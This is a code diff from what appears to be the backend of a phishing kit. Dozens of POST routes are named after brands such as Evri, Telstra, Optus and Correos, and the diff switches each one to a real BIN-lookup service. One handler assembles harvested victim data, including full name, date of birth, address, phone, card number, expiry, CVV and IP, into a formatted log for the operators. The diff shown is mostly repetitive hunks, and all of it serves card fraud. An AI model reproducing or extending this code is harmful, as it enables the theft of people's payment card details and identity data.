+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14616,7 +14616,7 @@ app.post("/energyBvjb", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14697,7 +14697,7 @@ app.post("/energyFpays", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14796,7 +14796,7 @@ app.post("/energyTriz", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14844,7 +14844,7 @@ app.post("/energy", async (req, res) => {
     }
     info.bin = formatBin;
   }
-  let binLookup = await axios.get(`https://google.com/`);
+  let binLookup = await axios.get(`https://lookup.binlist.net/${bin}`);
   let bank = binLookup.data.bank.name;
   let binList = `${info.bin} | ${info.dob} | ${info.pcode} | ${bank}`;
   var originalText = `+----------- Personal Information ------------+\nFull Name: ${info.fullName}\nDOB: ${info.dob}\nAddress: ${info.addy}\nPostcode: ${info.pcode}\nPhone Number: ${info.telephone}\n+ ----------- Card Information ------------+\nCard Name: ${info.ccname}\nCard Number: ${info.ccnum}\nExpiry: ${info.ccexp}\nCVV: ${info.cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${info.userAgent}\nIP: ${info.ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
@@ -14938,7 +14938,7 @@ app.post("/tCapz", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15021,7 +15021,7 @@ app.post("/t1Telstra", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15111,7 +15111,7 @@ app.post("/fredTelstra", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15201,7 +15201,7 @@ app.post("/osbTelstra", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15301,7 +15301,7 @@ app.post("/g7000telstra", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15405,7 +15405,7 @@ app.post("/spooferGooferOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15500,7 +15500,7 @@ app.post("/mmmOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15593,7 +15593,7 @@ app.post("/g700Optus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15686,7 +15686,7 @@ app.post("/firstTrustOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15792,7 +15792,7 @@ app.post("/gooferHaytchOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15871,7 +15871,7 @@ app.post("/offshorebillionsOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15976,7 +15976,7 @@ app.post("/loyaltyOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16067,7 +16067,7 @@ app.post("/YardzUnitEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16170,7 +16170,7 @@ app.post("/stackerEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16273,7 +16273,7 @@ app.post("/charlieEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16370,7 +16370,7 @@ app.post("/ghostEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16473,7 +16473,7 @@ app.post("/gh0stEvri", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16575,7 +16575,7 @@ app.post("/barksdaleEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16672,7 +16672,7 @@ app.post("/baliEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16777,7 +16777,7 @@ app.post("/dpEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16874,7 +16874,7 @@ app.post("/spooferEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16973,7 +16973,7 @@ app.post("/truthEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17070,7 +17070,7 @@ app.post("/goblinzEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17167,7 +17167,7 @@ app.post("/ciscoEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17266,7 +17266,7 @@ app.post("/pweightEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17365,7 +17365,7 @@ app.post("/ufoEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17464,7 +17464,7 @@ app.post("/ywfEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17563,7 +17563,7 @@ app.post("/saimEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17673,7 +17673,7 @@ app.post("/nchroEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17770,7 +17770,7 @@ app.post("/cbEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17838,7 +17838,7 @@ app.post("/eggmanEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17918,7 +17918,7 @@ app.post("/usufEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17992,7 +17992,7 @@ app.post("/trizEvri1", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18068,7 +18068,7 @@ app.post("/kyleEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18186,7 +18186,7 @@ app.post("/mkEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18291,7 +18291,7 @@ app.post("/chasingfundsEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18373,7 +18373,7 @@ app.post("/@skiii719", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18451,7 +18451,7 @@ app.post("/F_zn66", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18529,7 +18529,7 @@ app.post("/timeszEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18607,7 +18607,7 @@ app.post("/TheOnlyMYEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18677,7 +18677,7 @@ app.post("/hoodsEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18747,7 +18747,7 @@ app.post("/flashEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18819,7 +18819,7 @@ app.post("/haytchEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18896,7 +18896,7 @@ app.post("/dangerrEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18971,7 +18971,7 @@ app.post("/cdbEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19041,7 +19041,7 @@ app.post("/masonEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19117,7 +19117,7 @@ app.post("/mannymanEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19187,7 +19187,7 @@ app.post("/kelvEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19263,7 +19263,7 @@ app.post("/fpaysEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19364,7 +19364,7 @@ app.post("/fpaysEvri2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19432,7 +19432,7 @@ app.post("/fpaysEvri3", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19504,7 +19504,7 @@ app.post("/fpaysEvri4", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19576,7 +19576,7 @@ app.post("/fpaysEvri5", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19648,7 +19648,7 @@ app.post("/mannyman3", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19720,7 +19720,7 @@ app.post("/symEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19832,7 +19832,7 @@ app.post("/abzEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19950,7 +19950,7 @@ app.post("/tcapzEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -20067,7 +20067,7 @@ app.post("/pokaEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -20183,7 +20183,7 @@ app.post("/skiiGCEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -20395,7 +20395,7 @@ app.post("/@skiii719", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -20487,7 +20487,7 @@ app.post("/ssfinesse", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -20594,7 +20594,7 @@ app.post("/skatBilling", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -20692,7 +20692,7 @@ app.post("/correosKelv", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -20774,7 +20774,7 @@ app.post("/correosAK", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
